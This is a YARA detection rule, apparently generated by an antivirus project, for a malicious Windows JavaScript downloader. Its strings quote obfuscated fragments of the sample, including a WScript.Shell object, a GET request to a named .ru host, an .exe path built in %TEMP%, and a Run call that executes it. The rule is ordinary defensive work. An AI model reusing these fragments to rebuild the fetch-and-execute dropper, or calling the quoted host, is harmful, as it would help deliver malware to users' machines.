rule sig_20160401_f52486691f5f0a6629d4edb3d27df597 {
  meta:
    description = "datamaliciousorder - file 20160401_f52486691f5f0a6629d4edb3d27df597.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8a7b35375c946466064d92a631d419d84fc7450c87ef9c4a10d6cdf1b83c4d71"

  strings:
    $s1  = "function RrIi(AfgVo, DpRl){QbEn = QbEn * 1; return AfgVo - DpRl;};" fullword ascii
    $s2  = "var DsKye = function IitIjx() {return WScript[QvlPv](\"WScript\"+\".Shell\");}(), ZihWps = 11;" fullword ascii
    $s3  = "FbCji[JmClz](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s4  = "if (FbCji[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MtZlr(){return UhhHn + \"\";};" fullword ascii
    $s6  = "function ZvTu() {return DsKye[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xsxS4m0Q8MVsU.ex\" + \"e\";};" fullword ascii
    $s7  = "function OrnCwg() {return ((VdUgj == true) && (VdUgj == ErhYh)) ? 1 : QbEn;};" fullword ascii
    $s8  = "VdUgj = true; " fullword ascii
    $s9  = "ErhYh = true; " fullword ascii
    $s10 = "function CkUu()" fullword ascii
    $s11 = "var VdUgj = false;" fullword ascii
    $s12 = "var FaEc = false;" fullword ascii
    $s13 = "function WmMh(WfiNq) {var NwHg = (1, 2, 3, 4, 5, WfiNq); return NwHg;};" fullword ascii
    $s14 = "var ErhYh = false;" fullword ascii
    $s15 = "function TkyTvj(){return 23;};" fullword ascii
    $s16 = "function TocPhu(ZtkBqt){DsKye[\"R\"+\"un\"](ZtkBqt, QbEn, QbEn);};" fullword ascii
    $s17 = "function NoPwz(){return QvlPv;};" fullword ascii
    $s18 = "var OsVrb = new this[\"Date\"]();" fullword ascii
    $s19 = "return RrIi(CykUjf, OpKwt);" fullword ascii
    $s20 = "}while (GyBrt);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}